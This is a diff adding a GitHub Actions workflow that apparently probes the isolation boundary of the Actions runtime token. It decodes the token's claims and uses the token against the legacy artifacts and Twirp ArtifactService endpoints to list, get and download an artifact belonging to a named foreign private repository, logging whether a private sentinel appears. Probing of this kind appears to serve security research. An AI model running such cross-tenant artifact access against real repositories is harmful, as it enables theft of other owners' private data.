@@ -1,0 +1,89 @@
+name: g01-runtime-token-boundary-v4
+
+on:
+  push:
+  workflow_dispatch:
+
+jobs:
+  probe:
+    runs-on: ubuntu-latest
+    permissions:
+      contents: read
+      actions: read
+    env:
+      GH_TOKEN: ${{ github.token }}
+      FOREIGN_OWNER: apexblkw-ow-2lt415yust
+      FOREIGN_REPO: g01-private-control-20260803
+      FOREIGN_RUN: '30854116091'
+      FOREIGN_ARTIFACT: '8871751823'
+    steps:
+      - name: Create and upload owned artifact
+        run: |
+          mkdir -p own
+          printf '%s\n' 'G01_RUNTIME_V4_SELF_SENTINEL_20260803_P2H9' > own/sentinel.txt
+      - id: upload
+        uses: actions/upload-artifact@v4
+        with:
+          name: g01-runtime-v4-self-20260803-p2h9
+          path: own/sentinel.txt
+      - name: Confirm owned runtime consumer
+        id: self_download
+        continue-on-error: true
+        uses: actions/download-artifact@v4
+        with:
+          artifact-ids: ${{ steps.upload.outputs.artifact-id }}
+          path: self-downloaded
+      - name: Probe runtime host and v4 service
+        uses: actions/github-script@v7
+        with:
+          script: |
+            const token = process.env.ACTIONS_RUNTIME_TOKEN || '';
+            const runtimeUrl = (process.env.ACTIONS_RUNTIME_URL || '').replace(/\/$/, '');
+            const resultsUrl = (process.env.ACTIONS_RESULTS_URL || '').replace(/\/$/, '');
+            const foreignRun = process.env.FOREIGN_RUN;
+            const foreignArtifact = process.env.FOREIGN_ARTIFACT;
+
+            function decodeClaims(value) {
+              try {
+                const part = value.split('.')[1].replace(/-/g, '+').replace(/_/g, '/');
+                return JSON.parse(Buffer.from(part, 'base64').toString('utf8'));
+              } catch (_) { return {}; }
+            }
+            const claims = decodeClaims(token);
+            for (const [key, value] of Object.entries(claims)) {
+              if (/backend|workflow|job|scope|aud/i.test(key)) core.info(`claim=${key} value=${String(value).slice(0, 180)}`);
+            }
+            core.info(`self_download_outcome=${process.env.SELF_DOWNLOAD_OUTCOME || 'not-exported'}`);
+
+            for (const [label, base] of [['runtime', runtimeUrl], ['results', resultsUrl]]) {
+              if (!base || !token) continue;
+              for (const run of [process.env.GITHUB_RUN_ID, foreignRun]) {
+                const url = `${base}/_apis/pipelines/workflows/${run}/artifacts?api-version=6.0-preview`;
+                const response = await fetch(url, { headers: { authorization: `Bearer ${token}` } });
+                const body = await response.text();
+                core.info(`${label}_legacy_artifacts run=${run} status=${response.status} bytes=${body.length} private_sentinel=${body.includes('G01_PRIVATE_ARTIFACT_SENTINEL')} foreign_id=${body.includes(foreignArtifact)}`);
+              }
+            }
+
+            const workflowRunBackendId = claims['Actions.Results.WorkflowRunBackendId'] || claims['Actions.WorkflowRunBackendId'] || '';
+            const workflowJobRunBackendId = claims['Actions.Results.JobRunBackendId'] || claims['Actions.JobRunBackendId'] || '';
+            if (resultsUrl && token && workflowRunBackendId && workflowJobRunBackendId) {
+              const service = `${resultsUrl}/twirp/github.actions.results.api.v1.ArtifactService`;
+              const requests = [
+                ['ListArtifacts', { workflowRunBackendId, workflowJobRunBackendId }],
+                ['GetArtifact', { workflowRunBackendId, workflowJobRunBackendId, artifactId: foreignArtifact }],
+                ['DownloadArtifact', { workflowRunBackendId, workflowJobRunBackendId, artifactId: foreignArtifact }],
+                ['GetArtifact', { workflowRunBackendId, workflowJobRunBackendId, name: 'g01-private-artifact-20260803' }]
+              ];
+              for (const [method, request] of requests) {
+                const response = await fetch(`${service}/${method}`, {
+                  method: 'POST',
+                  headers: { authorization: `Bearer ${token}`, 'content-type': 'application/json' },
+                  body: JSON.stringify(request)
+                });
+                const body = await response.text();
+                core.info(`twirp_${method} status=${response.status} bytes=${body.length} private_sentinel=${body.includes('G01_PRIVATE_ARTIFACT_SENTINEL')} foreign_id=${body.includes(foreignArtifact)}`);
+              }
+            } else {
+              core.info(`twirp_claims_available=no results=${Boolean(resultsUrl)} token=${Boolean(token)} run_backend=${Boolean(workflowRunBackendId)} job_backend=${Boolean(workflowJobRunBackendId)}`);
+            }
